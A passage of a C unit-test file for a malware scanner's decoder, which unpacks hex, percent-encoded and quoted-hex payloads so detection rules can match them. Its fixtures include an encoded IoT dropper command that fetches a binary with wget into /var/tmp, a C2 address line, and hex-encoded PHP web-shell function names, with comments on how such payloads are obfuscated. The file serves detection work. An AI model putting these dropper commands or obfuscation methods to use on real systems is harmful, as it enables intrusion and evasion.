	memcpy(ref, buf, (size_t)n);
	check(kof_exe_unhex(buf, n) == 0, "hex: a short run is not a payload",
	      "below the floor a run is as likely to be a number");
	check(!memcmp(buf, ref, (size_t)n), "hex: and it is left intact",
	      "so the matcher still reads the bytes really there");
}

static void hex_keeps_an_ip_with_no_letters(void)
{
	/*
	 * EVERY C2 ADDRESS IN THE MEASURED SAMPLE LOOKS LIKE THIS, and an
	 * earlier version of the rule would have dropped all of them: requiring
	 * the decoded bytes to be mostly alphabetic loses 23 of 31 payloads,
	 * because an address has no letter in it at all.
	 */
	static const char ip[] = "\n0.0.0.0 136.243.89.164";
	uint8_t buf[128];
	uint64_t n = hex_case(buf, sizeof buf, ip);

	check(kof_exe_unhex(buf, n) == 1, "hex: an address decodes",
	      "no letters in it, and it is the most valuable line in the file");
	check(memmem(buf, (size_t)n, "136.243.89.164", 14) != NULL,
	      "hex: and reads as the address",
	      "an alphabetic test would have refused this");
}

/*
 * A LAYER UNDER A LAYER, and the rescan that makes it cheap.
 *
 * What comes out of one decode can be encoded again. One pass finds the
 * outermost and stops, so the driver runs rounds - and each round looks only
 * at what the previous one wrote, because nothing else can hold a layer that
 * has not been searched already.
 */
static void decode_follows_the_layers(void)
{
	static const char inner[] = "iptables -A OUTPUT -d pastebin.com -j DROP";
	static const char *d = "0123456789ABCDEF";
	uint8_t once[256], twice[600];
	uint64_t n1 = hex_case(once, sizeof once, inner);
	uint64_t i, n2;

	/*
	 * Hex the hex: the first decode yields hex text, and only a second
	 * round turns that into the command.
	 *
	 * The inner run's OWN characters and nothing else - not its leading
	 * space and not its terminator. Encoding the NUL puts a zero byte in
	 * what the outer layer decodes to, and a zero byte is not printable,
	 * so the outer run would be refused and the test would be measuring
	 * the fixture.
	 */
	twice[0] = ' ';
	for (i = 0; i + 2u < n1; i++) {
		twice[1 + 2 * i]     = (uint8_t)d[once[i + 1u] >> 4];
		twice[1 + 2 * i + 1] = (uint8_t)d[once[i + 1u] & 15];
	}
	n2 = 1u + 2u * (n1 - 2u);
	twice[n2++] = 0;

	check(kof_exe_unhex(twice, n2) == 1, "layers: one pass peels one",
	      "and what it leaves is still encoded");
	check(memmem(twice, (size_t)n2, inner, strlen(inner)) == NULL,
	      "layers: so one pass is not enough",
	      "the command is still two characters per byte");

	/* And the driver, from the original, all the way down. */
	twice[0] = ' ';
	for (i = 0; i + 2u < n1; i++) {
		twice[1 + 2 * i]     = (uint8_t)d[once[i + 1u] >> 4];
		twice[1 + 2 * i + 1] = (uint8_t)d[once[i + 1u] & 15];
	}
	check(kof_exe_decode(twice, n2) == 1, "layers: the driver decodes",
	      "it runs rounds until a round finds nothing");
	check(memmem(twice, (size_t)n2, inner, strlen(inner)) != NULL,
	      "layers: and reaches the command underneath",
	      "two layers of hex, and the second round is what got it");
}

/* ------------------------------------------------------------------------
 * PERCENT-ENCODED TEXT.
 *
 * ONE ESCAPE FORM AND NOT A FAMILY. An IoT dropper carries its exploits as
 * form bodies, and the command inside them is encoded by the protocol rather
 * than by the author - so the bytes a rule would be written against are not in
 * the file. Decoding `%XX` puts them there. Nothing here decodes `\xNN` or any
 * other convention; each would need its own measurement.
 */
static void pct_decodes_a_form_body(void)
{
	static const char in[] =
		" Cmd=wget+http%3A%2F%2F10.0.0.1%2Fmips+-O+%2Fvar%2Ftmp%2Finit";
	uint8_t buf[128];
	uint64_t n = sizeof in - 1u;

	memcpy(buf, in, (size_t)n);
	check(kof_exe_decode(buf, n) == 1,
	      "pct: an encoded command is decoded",
	      "four escapes, printable, and delimited");
	check(memmem(buf, (size_t)n, "wget http://10.0.0.1/mips", 25) != NULL,
	      "pct: and it reads as the command",
	      "which is what a rule would be written against");
	check(memmem(buf, (size_t)n, "%3A", 3) == NULL,
	      "pct: the escapes are gone",
	      "a second pass has nothing left to find");
	/*
	 * `+` IS A SPACE HERE. A form body spells the separator that way, and
	 * left alone the decoded text reads "wget+http://" - which a rule
	 * written on the plain command still misses.
	 */
	check(memmem(buf, (size_t)n, "wget+", 5) == NULL,
	      "pct: and the pluses are spaces",
	      "the separator a form body uses");
}

/*
 * AND A RUN WITH TOO FEW OF THEM IS LEFT ALONE.
 *
 * A stray "%2e" in a version string or a format is not an encoded payload, and
 * a scanner that rewrote it would be changing bytes on a guess. The floor is
 * the same shape the hex pass uses and exists for the same reason.
 */
static void pct_leaves_a_stray_escape(void)
{
	static const char in[] = " version=1.0%2e3 and nothing else here";
	uint8_t buf[128];
	uint64_t n = sizeof in - 1u;

	memcpy(buf, in, (size_t)n);
	check(kof_exe_decode(buf, n) == 0,
	      "pct: one escape is not a payload",
	      "under the floor, so nothing is rewritten");
	check(!memcmp(buf, in, (size_t)n),
	      "pct: and the bytes are untouched",
	      "a guess that changed the object would be worse than a miss");
}

/*
 * AND A DOUBLED PERCENT IS A FORMAT STRING.
 *
 * A shell that prints an encoded payload writes every `%` twice, because
 * printf eats one of them. Read as escapes, the second of each pair opens one
 * and the first is left behind - `%%7B%%22` becomes `%{%"`, which is neither
 * what is in the file nor what the shell would print. An encoder never emits
 * two in a row (a literal percent is `%25`), so the pair is the tell, and a
 * run carrying one is left as the author wrote it.
 */
static void pct_refuses_a_doubled_percent(void)
{
	static const char in[] =
		" printf '%%7B%%22f%%22:%%22x%%22%%2C%%22g%%22%%7D'";
	uint8_t buf[128];
	uint64_t n = sizeof in - 1u;

	memcpy(buf, in, (size_t)n);
	check(kof_exe_decode(buf, n) == 0,
	      "pct: a doubled percent is not a payload",
	      "printf spells a literal percent that way");
	check(!memcmp(buf, in, (size_t)n),
	      "pct: and the format string is untouched",
	      "half-decoding it would write down a third thing");
	check(memmem(buf, (size_t)n, "%{%\"", 4) == NULL,
	      "pct: the half-decoded shape is not produced",
	      "which is what the run decoded to before");
}

/*
 * ---- a table of quoted hex literals, which is how a web shell spells its
 *      own API ----------------------------------------------------------
 *
 * Each of these is under HEX_RUN_MIN, so the bare-run rule leaves every one of
 * them. What makes them readable is that the run is the WHOLE body of a string
 * literal and that there are several - see HEXQ_MIN. Both halves are asserted
 * here, and so is each thing that must keep them out.
 */
static void hex_decodes_a_quoted_table(void)
{
	static const char in[] =
		"$a = ['7068705f756e616d65','6368646972',"
		"'676574637764','756e6c696e6b','6d6b646972','636f7079'];";
	uint8_t buf[256];
	uint64_t n = sizeof in - 1u;

	memcpy(buf, in, (size_t)n);
	check(kof_exe_decode(buf, n) == 1,
	      "hex: a table of quoted literals decodes",
	      "five of them, each the whole body of a string");
	check(memmem(buf, (size_t)n, "php_uname", 9) != NULL,
	      "hex: and the shortest are in it",
	      "eighteen characters, well under the bare-run floor");
	check(memmem(buf, (size_t)n, "chdir", 5) != NULL &&
	      memmem(buf, (size_t)n, "mkdir", 5) != NULL,
	      "hex: including the ten-character ones",
	      "five bytes is a function name a rule is written against");
	/* Four of these carry a hex letter and two do not; the two came along
	 * because the table did - see hex_letter. */
	check(memmem(buf, (size_t)n, "getcwd", 6) != NULL,
	      "hex: and the all-digit members too",
	      "676574637764 has no letter and is still decoded");
}

/*
 * AND ONE OF THEM IS A MAGIC NUMBER.
 *
 * A lone quoted hex constant is as likely to be a length, a mask or an id as
 * a payload, and nothing about one literal can tell those apart. The floor is
 * a COUNT for that reason, and this is the side of it that must not move.
 */
static void hex_leaves_a_lone_quoted_literal(void)
{
	static const char in[] = "if ($x == '41424344') { return 1; }";
	uint8_t buf[128];
	uint64_t n = sizeof in - 1u;

	memcpy(buf, in, (size_t)n);
	check(kof_exe_decode(buf, n) == 0,
	      "hex: one quoted literal is not a table",
	      "under HEXQ_MIN, so nothing is rewritten");
	check(!memcmp(buf, in, (size_t)n),
	      "hex: and its bytes are untouched",
	      "a guess that changed the object would be worse than a miss");
}

/*
 * A TABLE OF HASHES IS NOT A TABLE OF STRINGS, and the printable test is what
 * says so - before any counting, on every byte. These five are quoted, are
 * plenty numerous, and decode to bytes no text holds.
 */
static void hex_refuses_a_quoted_hash_table(void)
{
	static const char in[] =
		"$h = ['deadbeefcafe1234','0011223344556677',"
		"'8899aabbccddeeff','1234567890abcdef','fedcba0987654321'];";
	uint8_t buf[256];
	uint64_t n = sizeof in - 1u;

	memcpy(buf, in, (size_t)n);
	check(kof_exe_decode(buf, n) == 0,
	      "hex: quoted hashes are still hashes",
	      "every byte must be text and none of these is");
	check(!memcmp(buf, in, (size_t)n),
	      "hex: and the table is untouched",
	      "counting cannot rescue what the byte test refused");
}

/*
 * A DOCUMENT OF QUOTED INTEGERS IS NOT A TABLE OF STRINGS.
 *
 * `0`..`9` are hex digits, so a decimal number in quotes passes the quoting
 * test, the even test and - often enough - the printable one: "2147483648"
 * decodes to `!GH6H`. These are the flag values out of a GObject
 * introspection file, which is one of the four files on this machine the rule
 * rewrote before the count was narrowed to literals carrying a hex letter.
 */
static void hex_refuses_a_table_of_decimals(void)
{
	static const char in[] =
		"<f v=\"2147483648\"/><f v=\"2147483649\"/>"
		"<f v=\"2147483650\"/><f v=\"2147483651\"/>"
		"<f v=\"2147483652\"/><f v=\"33554432\"/>";
	uint8_t buf[256];
	uint64_t n = sizeof in - 1u;

	memcpy(buf, in, (size_t)n);
	check(kof_exe_decode(buf, n) == 0,
	      "hex: quoted decimals are numbers",
	      "no decimal carries a hex letter, so none counts");
	check(!memcmp(buf, in, (size_t)n),
	      "hex: and the document is untouched",
	      "a scanner that rewrote these would rewrite every config file");
}

/*
 * AND A LETTERLESS MEMBER OF A REAL TABLE IS STILL DECODED.
 *
 * The letter test is on the COUNT, not on each literal: "chdir" is 6368646972
 * and carries no letter. It decodes because the table around it proved itself.
 */
static void hex_decodes_a_letterless_member(void)
{
	static const char in[] =
		"$a = ['7068705f756e616d65','70687076657273696f6e',"
		"'707265675f73706c6974','636f7079','6368646972'];";
	uint8_t buf[256];
	uint64_t n = sizeof in - 1u;

	memcpy(buf, in, (size_t)n);
	check(kof_exe_decode(buf, n) == 1,
	      "hex: four lettered literals carry the table",
	      "the count is the file's property, not one string's");
	check(memmem(buf, (size_t)n, "chdir", 5) != NULL,
	      "hex: and the letterless one comes with it",
	      "6368646972 is all digits and is still a function name");
}

/*
 * THE QUOTES HAVE TO BE THE RUN'S OWN. Unquoted, a short run is back to having
 * nothing but hex_delim behind it, which is the case HEX_RUN_MIN exists for.
 * An unmatched pair is not a literal either.
 */
static void hex_needs_the_quotes_to_close(void)
{
	static const char bare[] =
		"a 7068705f756e616d65 b 6368646972 c 676574637764 "
		"d 756e6c696e6b e 6d6b646972";
	static const char odd[] =
		"$a = [\"7068705f756e616d65','6368646972\","
		"'676574637764\",\"756e6c696e6b','6d6b646972\"];";
	uint8_t buf[256];
	uint64_t n;

	n = sizeof bare - 1u;
	memcpy(buf, bare, (size_t)n);
	check(kof_exe_decode(buf, n) == 0 && !memcmp(buf, bare, (size_t)n),
	      "hex: unquoted short runs are left alone",
	      "a space in front is not a declaration");

	n = sizeof odd - 1u;
	memcpy(buf, odd, (size_t)n);
	check(kof_exe_decode(buf, n) == 0 && !memcmp(buf, odd, (size_t)n),
	      "hex: a quote must close with its own kind",
	      "otherwise the run is not the whole body of a string");
}

int main(void)
{
	printf("normalize exe:\n");
	setvbuf(stdout, NULL, _IONBF, 0);

	a_literal_cannot_hold_a_zero();
	nothing_to_do_costs_nothing();
	a_short_zero_run_is_left_alone();
	two_zeros_and_not_one();
	wide_becomes_ascii();
	no_zero_free_match_is_ever_lost();
	the_view_is_never_longer();
	the_map_covers_the_output();

	b64_decodes_the_mirai_shape();
	b64_is_idempotent();
	b64_needs_a_pipe();
	b64_stops_at_an_inner_equals();
	b64_reads_every_spelling();
	b64_ignores_a_short_run();
	b64_touches_only_its_own_run();

	map_agrees_with_the_transform();
	kept_regions_do_not_move();
	a_run_stops_at_the_boundary();
	a_dropped_span_leaves_the_view();
	an_empty_view_is_not_an_unchanged_one();

	hex_decodes_a_command();
	pct_decodes_a_form_body();
	pct_leaves_a_stray_escape();
	pct_refuses_a_doubled_percent();
	hex_decodes_a_quoted_table();
	hex_leaves_a_lone_quoted_literal();
	hex_refuses_a_quoted_hash_table();
	hex_refuses_a_table_of_decimals();
	hex_decodes_a_letterless_member();
	hex_needs_the_quotes_to_close();
	hex_refuses_a_hash();
	hex_needs_a_delimiter();
	hex_ignores_a_short_run();
	hex_keeps_an_ip_with_no_letters();
	decode_follows_the_layers();

	if (fails) {
		printf("\nnormalize exe: %d check(s) failed\n", fails);
		return 1;
	}
	printf("\nnormalize exe: ok\n");
	return 0;
}
